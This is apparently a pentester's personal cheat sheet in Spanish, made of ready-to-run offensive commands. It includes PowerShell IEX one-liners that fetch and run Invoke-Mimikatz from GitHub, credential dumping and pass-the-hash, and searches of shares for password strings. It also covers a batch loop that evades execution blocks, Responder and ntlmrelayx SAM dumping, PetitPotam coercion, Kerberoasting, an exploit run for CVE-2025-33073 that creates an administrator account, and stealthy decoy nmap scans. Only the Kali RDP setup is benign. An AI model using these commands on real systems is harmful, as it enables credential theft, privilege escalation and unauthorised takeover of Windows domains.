# 🛠️ Mis Apuntes de Trabajo

## Mimikatz

### Opciones de carga (IEX)

**Opción 1**

PowerShell

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1')
```

**Opción 2**

PowerShell

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/b1aba6be193c1d34c62272124c8ef7084f7e552c/Invoke-Mimikatz.ps1')
```

**Opción 3**

PowerShell

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1') 
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1')
```

### Comandos de ejecución

Una vez abierto y ejecutado:

PowerShell

```
Invoke-Mimikatz -command privilege::debug  
Invoke-Mimikatz –command Sekurlsa::logonpasswords




sekurlsa::pth /user:[USERNAME_SUPLANTAR] /rc4:[HASH_NTLM] /domain:[DOMINIO] /run:cmd.exe
```
#PassTheHash 

Este ultimo comando nos da una consola con la sesión del suplantado
## Búsqueda en el sistema

Para buscar archivos específicos:

DOS

```
dir /S /B J:\sistemas\*.sql
```

Para buscar strings de contraseñas:

DOS

```
findstr /S /I /M /P /C:"pass" /C:"password" J:\sistemas\*.* dir /S /B J:\sistemas\*.sql J:\sistemas\*.ps1 J:\sistemas\*.bat
```

**JWT:** [https://jwt.lannysport.net/](https://jwt.lannysport.net/)

---

## Evasión y Descargas

**Evadir bloqueos de ejecución CMD/Powershell:**

Fragmento de código

```
@echo off  
:loop  
set /p command=Comando: 
%command%  
goto loop
```

**Descargar winpeas:**

PowerShell

```
.\curl.exe -L -k -o WP.exe "https://github.com/peass-ng/PEASS-ng/releases/download/20251028-8d75ce03/winPEASx86.exe"
```

---

## Responder y NTLMrelayx

Bash

```
sudo responder -I eth0 -dwv  
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt
```

**Opciones de Relay:**

Bash

```
# Opción A: Dumpeo de SAM directo si es admin
sudo impacket-ntlmrelayx -tf relay_list.txt -smb2support --remove-mic

# Opción B: Abrir puertos SOCKS
sudo impacket-ntlmrelayx -tf relay_list.txt -smb2support -socks
```

> El primero dumpea la SAM si pilla admin; el segundo permite usar comandos socks para ver si son admins y usarlas a medida.

---

## Directorio Activo (AD)

**Bloodhound:**

Bash

```
bloodhound-python -u 'USUARIO' -p 'CONTRASEÑA' -d 'DOMINIO.LOCAL' -c All -v --zip
```

**GetUserSPNs:**

Bash

```
impacket-GetUserSPNs HTB.LOCAL/Auditoria:TuContraseña -request -dc-ip <IP_DC> -target-user QSECOFR
```

---

## Coerce_Plus

1. **Responder:** `sudo responder -I eth0 -dwv` (Con todo en ON)
    
2. **Ejecución:**
    

Bash

```
nxc smb IP_VICTIMA -u 'USER' -p 'PASS' -M coerce_plus -o LISTENER=IP_KALI METHOD=PetitPotam
```

_Los hashes aparecerán en el Responder._

---

## Configuración de Kali (RDP y SSH)

**Activar RDP:**

Bash

```
sudo apt update && sudo apt upgrade -y
sudo apt install -y xfce4 xfce4-goodies xrdp
echo "startxfce4" > ~/.xsession
sudo cp /etc/xrdp/startwm.sh /etc/xrdp/startwm.sh.bak
sudo bash -c 'cat > /etc/xrdp/startwm.sh <<EOF
#!/bin/sh
unset DBUS_SESSION_BUS_ADDRESS
unset XDG_RUNTIME_DIR
startxfce4
EOF'
sudo chmod +x /etc/xrdp/startwm.sh
sudo systemctl enable --now xrdp
sudo systemctl status xrdp --no-pager
```

_Link:_ [Acceder escritorio Kali](https://muylinux.xyz/como-acceder-al-escritorio-kali-usando-el-protocolo-de-escritorio-remoto/)

**Activar SSH:**

Bash

```
sudo apt install openssh-server  
sudo systemctl start ssh
```

---

## CVE 2025-33073

Bash

```
# Reconocimiento
nxc smb 192.168.56.0/24 -u samwell.tarly -p Heartsbane

# Explotación (Command execution / Hash dump)
python3 CVE-2025-33073.py -u 'north.sevenkingdoms.local\samwell.tarly' -p 'Heartsbane' --attacker-ip 192.168.56.201 --dns-ip 192.168.56.11 --dc-fqdn WINTERFELL.north.sevenkingdoms.local --target 192.168.56.22 --target-ip 192.168.56.22 --cli-only

# Acceso con Hash
nxc smb 192.168.56.22 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4" --local-auth

# Creación de usuario administrador
python3 CVE-2025-33073.py -u 'north.sevenkingdoms.local\samwell.tarly' -p 'Heartsbane' --attacker-ip 192.168.56.201 --dns-ip 192.168.56.11 --dc-fqdn WINTERFELL.north.sevenkingdoms.local --target 192.168.56.22 --target-ip 192.168.56.22 --cli-only --custom-command "net user testcve 123456 /add"
python3 CVE-2025-33073.py -u 'north.sevenkingdoms.local\samwell.tarly' -p 'Heartsbane' --attacker-ip 192.168.56.201 --dns-ip 192.168.56.11 --dc-fqdn WINTERFELL.north.sevenkingdoms.local --target 192.168.56.22 --target-ip 192.168.56.22 --cli-only --custom-command "net localgroup Administrators testcve /add"
```

---

## SMB PWND! (Administradores locales)

**Activar política de filtrado:**

PowerShell

```
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType DWord -Force
```

**Revertir cambio:**

PowerShell

```
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy"
```

---

## NMAP Sigiloso

Bash

```
nmap -sS --top 1000 --open --max-rate 1000 -n -Pn -iL [Lista_IPS] -D RND:5 --disable-arp-ping --source-port 53 > nmap.txt
```

---

## Burp Suite con VPN / Túnel SSH

1. **Túnel SSH:** `ssh -D 1080 root@172.28.0.164`
    
2. **Navegador (SOCKS5):** IP `127.0.0.1`, Puerto `1080`.
    
    - **IMPORTANTE:** Activar "Proxy DNS" o "Remote DNS".
        

---

## Varios

**Recursos (Hasta 20/3):** [https://ydray.com/get/t/u17733882705263RrdPecb29336e0afeL](https://ydray.com/get/t/u17733882705263RrdPecb29336e0afeL)